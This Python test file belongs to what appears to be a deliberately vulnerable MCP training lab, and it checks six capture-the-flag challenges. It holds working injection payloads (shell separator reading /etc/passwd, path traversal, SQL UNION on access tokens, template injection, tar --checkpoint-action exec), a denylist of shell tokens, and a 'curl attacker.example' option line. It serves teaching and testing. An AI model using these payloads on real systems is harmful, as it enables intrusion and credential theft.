from __future__ import annotations

import asyncio
import json
import pathlib
import tempfile
import unittest
from pathlib import Path

from starlette.testclient import TestClient

from ops import database, lab, sandbox
from ops.mcp_server import (
    archive_logs,
    command_manual,
    describe_schema,
    execution_rules,
    incident_triage,
    investigate_ticket,
    list_reports,
    list_services,
    list_templates,
    list_tickets,
    log_review,
    mcp,
    my_access,
    read_report,
    render_summary,
    reset_demo_state,
    search_customers,
    service_record,
    tail_log,
    ticket_record,
)
from ops.web import app


PAYLOADS = {
    "shell_metachar": "payments-api; cat /etc/passwd #",
    "path_traversal": "../config/ops.toml",
    "sql_injection": "x' UNION SELECT customer, token, scope FROM access_tokens --",
    "template_injection": "{{ console.token }}",
    "argument_injection": '--checkpoint-action=exec=sh -c "cat /srv/ops/config/ops.toml"',
}


class OpsLabTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.original_db_path = database.DB_PATH
        database.DB_PATH = Path(self.temp_dir.name) / "ops.db"
        database.initialize_database(reset=True)
        lab.reset_flags()
        reset_demo_state()
        self.client = TestClient(app)

    def tearDown(self) -> None:
        self.client.close()
        database.DB_PATH = self.original_db_path
        self.temp_dir.cleanup()

    def flags_in(self, result: dict) -> list[str]:
        """Every tool reports its flag at the top level. Nothing nests any more."""
        return [result["audit_reference"]] if "audit_reference" in result else []

    def test_nothing_in_this_package_can_execute(self) -> None:
        """The safety guarantee, asserted rather than promised.

        A lab that genuinely ran injected commands on a player's machine would be a
        vulnerability rather than a lesson.
        """
        package = pathlib.Path(__file__).resolve().parent.parent / "ops"
        sources = sorted(package.glob("*.py"))
        # Without this the whole test passes vacuously if the package is renamed or moved.
        self.assertGreaterEqual(len(sources), 5, "the package glob found nothing to check")
        banned = (
            "subprocess",
            "os.system",
            "os.popen",
            "os.exec",
            "shell=True",
            "__import__",
            "importlib",
            "runpy",
            "pty.",
        )
        for source in sources:
            text = source.read_text()
            code = "\n".join(
                line for line in text.splitlines() if not line.strip().startswith("#")
            )
            # The module docstring names these to explain their absence, so strip strings
            # that are documentation before checking.
            body = code.split('"""')
            body = "".join(body[::2]) if len(body) > 1 else code
            for token in banned:
                self.assertNotIn(token, body, f"{source.name} contains {token}")
            for call in ("eval(", "exec(", "compile("):
                self.assertNotIn(call, body, f"{source.name} calls {call}")

    def test_brand_and_lab_state(self) -> None:
        self.assertEqual(self.client.get("/api/lab/state").json(), {"run_id": lab.RUN_ID})
        self.assertEqual(self.client.get("/health").json(), {"status": "ok", "service": "ops_mcp"})
        root = self.client.get("/").json()
        self.assertEqual(root["service"], "ops_mcp")
        self.assertEqual(root["lab"], "MCP05:2025")

    def test_gui_origin_is_allowed_and_others_are_not(self) -> None:
        gui = "http://127.0.0.1:8410"
        self.assertEqual(
            self.client.get("/api/health", headers={"Origin": gui}).headers[
                "access-control-allow-origin"
            ],
            gui,
        )
        blocked = self.client.get("/api/health", headers={"Origin": "https://evil.example"})
        self.assertNotIn("access-control-allow-origin", blocked.headers)

    def test_cross_site_post_cannot_reset_or_submit(self) -> None:
        run_id_before = lab.RUN_ID
        self.assertEqual(
            self.client.post("/api/lab/reset", headers={"Origin": "https://evil.example"}).status_code,
            403,
        )
        self.assertEqual(lab.RUN_ID, run_id_before)
        self.assertEqual(self.client.post("/api/lab/reset").status_code, 200)

    def test_capability_names_and_counts(self) -> None:
        tools = asyncio.run(mcp.list_tools())
        resources = asyncio.run(mcp.list_resources())
        templates = asyncio.run(mcp.list_resource_templates())
        prompts = asyncio.run(mcp.list_prompts())

        self.assertEqual(
            {tool.name for tool in tools},
            {
                "my_access",
                "list_services",
                "list_reports",
                "describe_schema",
                "list_templates",
                "list_tickets",
                "tail_log",
                "read_report",
                "search_customers",
                "render_summary",
                "investigate_ticket",
                "archive_logs",
            },
        )
        self.assertEqual(len(tools), 12)
        self.assertEqual(len(resources), 1)
        self.assertEqual(len(templates), 3)
        self.assertEqual({prompt.name for prompt in prompts}, {"incident_triage", "log_review"})

    def test_every_challenge_input_is_enumerable(self) -> None:
        """The table in mcp05.md, asserted. No challenge may need a value you cannot find."""
        # 1: service names, and a refusal that names what it blocked.
        self.assertIn("payments-api", [item["service"] for item in list_services()["services"]])
        refused = tail_log("payments-api && whoami")
        self.assertEqual(refused["blocked_token"], "&&")

        # 2: the reports directory, and a target worth walking to.
        reports = list_reports()
        self.assertEqual(reports["reports_dir"], sandbox.REPORTS_DIR)
        self.assertIn(sandbox.CONSOLE_CONFIG, execution_rules())

        # 3: the schema, including the table search_customers never queries.
        tables = {item["table"] for item in describe_schema()["tables"]}
        self.assertIn("customers", tables)
        self.assertIn("access_tokens", tables)

        # 4: the templates, and the probe that proves the body is evaluated.
        templates = list_templates()["templates"]
        self.assertIn("incident-summary", [item["template"] for item in templates])
        self.assertEqual(render_summary(body="{{ 7*7 }}")["rendered"], "49")

        # 5: ticket ids, and the resource that shows the customer-supplied field.
        listed = list_tickets()
        self.assertIn("TK-3312", [item["ticket_id"] for item in listed["tickets"]])
        self.assertEqual(listed["read_with"], "ticket://ops/{ticket_id}")
        self.assertIn("cat /etc/passwd", ticket_record("TK-3312"))

        # 6: tar's option behaviour, documented rather than assumed knowledge.
        manual = json.loads(command_manual("tar"))
        self.assertIn("--checkpoint-action", manual["options"])

    def test_list_tickets_hides_the_field_the_resource_shows(self) -> None:
        """The payload has to be found by reading the ticket, not handed over in a list."""
        for ticket in list_tickets()["tickets"]:
            self.assertNotIn("affected_service", ticket)

    def test_six_flags_are_earned_in_the_agreed_paths(self) -> None:
        self.assertEqual(len(set(lab.FLAGS.values())), 6)

        shelled = tail_log(PAYLOADS["shell_metachar"])
        self.assertEqual(shelled["commands_run"], 2)
        self.assertEqual(self.flags_in(shelled), [lab.flag_for("shell_metachar")])

        traversed = read_report(PAYLOADS["path_traversal"])
        self.assertEqual(traversed["resolved_to"], sandbox.CONSOLE_CONFIG)
        self.assertEqual(self.flags_in(traversed), [lab.flag_for("path_traversal")])

        injected = search_customers(PAYLOADS["sql_injection"])
        self.assertTrue(any("ops_live_" in str(row) for row in injected["results"]))
        self.assertEqual(self.flags_in(injected), [lab.flag_for("sql_injection")])

        rendered = render_summary(body=PAYLOADS["template_injection"])
        self.assertIn("ops_live_7f3a2c91d4e86b05af23c7910b8d4e6f", rendered["rendered"])
        self.assertEqual(self.flags_in(rendered), [lab.flag_for("template_injection")])

        investigated = investigate_ticket("TK-3312")
        self.assertEqual(self.flags_in(investigated), [lab.flag_for("indirect_payload")])
        # The ticket must not be a replay of challenge 1 with one field changed.
        self.assertIn("payload_from", investigated)
        self.assertNotIn("payload_from", shelled)

        archived = archive_logs(PAYLOADS["argument_injection"])
        self.assertEqual(archived["read_as"], "option")
        self.assertEqual(archived["option"], "--checkpoint-action")
        self.assertIn("exec=", archived["option_does"])
        self.assertEqual(archived["would_execute"], 'sh -c "cat /srv/ops/config/ops.toml"')
        self.assertIn("ops_live_", archived["output_if_run"])
        self.assertEqual(archived["impact"], "remote code execution")
        self.assertFalse(archived["shell"])
        self.assertEqual(self.flags_in(archived), [lab.flag_for("argument_injection")])

    def test_legitimate_actions_return_no_flag(self) -> None:
        for label, result in (
            ("tail_log", tail_log("payments-api")),
            ("read_report", read_report("inc-2291.md")),
            ("search_customers", search_customers("Acme")),
            ("render_summary", render_summary("incident-summary")),
            ("investigate_ticket", investigate_ticket("TK-3315")),
            ("archive_logs", archive_logs("/srv/logs")),
            ("my_access", my_access()),
        ):
            with self.subTest(tool=label):
                self.assertEqual(self.flags_in(result), [])

    def test_the_denylist_is_real_and_incomplete(self) -> None:
        """A denylist that blocked nothing would teach nothing."""
        for payload, token in (
            ("api && whoami", "&&"),
            ("api | tee x", "|"),
            ("api `whoami`", "`"),
            ("api $(whoami)", "$("),
            ("api > /tmp/x", ">"),
        ):
            refused = tail_log(payload)
            self.assertEqual(refused["status"], "rejected", payload)
            self.assertEqual(refused["blocked_token"], token)
            self.assertEqual(self.flags_in(refused), [])

        # The hole. This is the whole of challenge 1.
        self.assertIsNone(sandbox.blocked_token("api; whoami"))

    def test_a_separator_with_nothing_after_it_earns_nothing(self) -> None:
        """A trailing semicolon splits the string without running a command."""
        result = tail_log("payments-api;")
        self.assertEqual(self.flags_in(result), [])

    def test_argument_injection_uses_no_shell_and_no_metacharacter(self) -> None:
        """If either creeps in, challenge 6 collapses into challenge 1."""
        result = archive_logs(PAYLOADS["argument_injection"])
        self.assertFalse(result["shell"])
        self.assertIsNone(sandbox.blocked_token(PAYLOADS["argument_injection"]))
        self.assertEqual(result["argv"][0], "tar")
        self.assertIn(PAYLOADS["argument_injection"], result["argv"])

    def test_only_options_that_run_a_command_are_called_execution(self) -> None:
        """An option that reconfigures tar is still a finding, and it is not RCE."""
        for value, command in (
            ("--checkpoint-action=exec=sh", "sh"),
            ("--to-command=curl attacker.example", "curl attacker.example"),
            ("--use-compress-program=sh", "sh"),
        ):
            with self.subTest(value=value):
                result = archive_logs(value)
                self.assertEqual(result["would_execute"], command)
                self.assertEqual(result["impact"], "remote code execution")
                # Nothing was read, so nothing is claimed to have been read.
                self.assertNotIn("output_if_run", result)

        # Naming a file is what turns "runs a command" into a visible consequence.
        read = archive_logs(PAYLOADS["argument_injection"])
        self.assertIn("ops_live_", read["output_if_run"])

        for value in ("--checkpoint=1", "--checkpoint-action=echo", "-C"):
            with self.subTest(value=value):
                result = archive_logs(value)
                # Still argument injection, so still flagged.
                self.assertEqual(result["read_as"], "option")
                self.assertEqual(self.flags_in(result), [lab.flag_for("argument_injection")])
                self.assertNotIn("would_execute", result)
                self.assertNotIn("impact", result)

    def test_the_ticket_payload_is_not_typed_by_the_player(self) -> None:
        """Challenge 5 is not MCP03. The agent decides nothing, a stored string does."""
        result = investigate_ticket("TK-3312")
        self.assertIn("tickets table", result["payload_from"])
        self.assertIn("typed by a customer", result["payload_from"])
        # The player supplied a ticket id and nothing else.
        self.assertEqual(result["ticket"], "TK-3312")
        self.assertNotIn("TK-3312", result["investigated_service"])

        typed = tail_log(PAYLOADS["shell_metachar"])
        self.assertNotIn("payload_from", typed)
        self.assertEqual(self.flags_in(typed), [lab.flag_for("shell_metachar")])

    def test_each_challenge_first_leaves_the_others_working(self) -> None:
        openers = (
            lambda: tail_log(PAYLOADS["shell_metachar"]),
            lambda: read_report(PAYLOADS["path_traversal"]),
            lambda: search_customers(PAYLOADS["sql_injection"]),
            lambda: render_summary(body=PAYLOADS["template_injection"]),
            lambda: investigate_ticket("TK-3312"),
            lambda: archive_logs(PAYLOADS["argument_injection"]),
        )
        for index, opener in enumerate(openers):
            reset_demo_state()
            lab.reset_flags()
            opener()

            self.assertEqual(
                self.flags_in(tail_log(PAYLOADS["shell_metachar"])),
                [lab.flag_for("shell_metachar")],
                f"opener {index}",
            )
            self.assertEqual(
                self.flags_in(read_report(PAYLOADS["path_traversal"])),
                [lab.flag_for("path_traversal")],
            )
            self.assertEqual(
                self.flags_in(search_customers(PAYLOADS["sql_injection"])),
                [lab.flag_for("sql_injection")],
            )
            self.assertEqual(
                self.flags_in(render_summary(body=PAYLOADS["template_injection"])),
                [lab.flag_for("template_injection")],
            )
            self.assertEqual(
                self.flags_in(investigate_ticket("TK-3312")), [lab.flag_for("indirect_payload")]
            )
            self.assertEqual(
                self.flags_in(archive_logs(PAYLOADS["argument_injection"])),
                [lab.flag_for("argument_injection")],
            )

    def test_unknown_inputs_are_rejected_without_a_flag(self) -> None:
        for result in (
            tail_log("nope"),
            tail_log(""),
            read_report(""),
            read_report("nope.md"),
            search_customers(""),
            render_summary("nope"),
            investigate_ticket("TK-9999"),
            archive_logs(""),
        ):
            self.assertEqual(result["status"], "rejected")
            self.assertEqual(self.flags_in(result), [])

    def test_resources_and_prompts_carry_no_flag(self) -> None:
        text = "".join(
            (
                execution_rules(),
                service_record("payments-api"),
                service_record("nope"),
                ticket_record("TK-3312"),
                ticket_record("nope"),
                command_manual("tar"),
                command_manual("tail"),
                command_manual("nope"),
                incident_triage(),
                log_review("payments-api"),
            )
        )
        for flag in lab.FLAGS.values():
            self.assertNotIn(flag, text)

    def test_policy_names_a_rule_for_every_challenge(self) -> None:
        rules = " ".join(json.loads(execution_rules())["rules"]).lower()
        for challenge, phrase in (
            ("shell_metachar", "concatenate a caller value into a command string"),
            ("path_traversal", "inside its base directory"),
            ("sql_injection", "bind every database value"),
            ("template_injection", "smallest context"),
            ("indirect_payload", "read from storage"),
            ("argument_injection", "read as an option"),
        ):
            self.assertIn(phrase, rules, challenge)

    def test_a_non_ascii_flag_is_wrong_rather_than_a_server_error(self) -> None:
        for pasted in ("FLAG{\u00e9}", "FLAG{a\u2014b}", "FLAG{\u00a0}"):
            self.assertFalse(lab.is_valid_flag("shell_metachar", pasted))
            response = self.client.post(
                "/api/lab/submit", json={"challenge_id": "shell_metachar", "flag": pasted}
            )
            self.assertEqual(response.status_code, 200)
            self.assertFalse(response.json()["correct"])

    def test_flags_are_validated_without_returning_expected_values(self) -> None:
        rejected = self.client.post(
            "/api/lab/submit", json={"challenge_id": "shell_metachar", "flag": "FLAG{wrong}"}
        )
        self.assertEqual(rejected.json(), {"challenge_id": "shell_metachar", "correct": False})
        accepted = self.client.post(
            "/api/lab/submit",
            json={"challenge_id": "shell_metachar", "flag": lab.flag_for("shell_metachar")},
        )
        self.assertTrue(accepted.json()["correct"])
        self.assertEqual(
            self.client.post("/api/lab/submit", json={"challenge_id": "nope", "flag": "x"}).status_code,
            404,
        )

    def test_reset_rotates_flags_and_restores_every_mutation(self) -> None:
        previous_flags = dict(lab.FLAGS)
        search_customers(PAYLOADS["sql_injection"])
        investigate_ticket("TK-3312")

        self.assertEqual(self.client.post("/api/lab/reset").status_code, 200)
        self.assertNotEqual(dict(lab.FLAGS), previous_flags)
        self.assertEqual(len(list_tickets()["tickets"]), 3)
        self.assertEqual(
            database.find_ticket("TK-3312")["affected_service"],
            "payments-api; cat /etc/passwd #",
        )


if __name__ == "__main__":
    unittest.main()
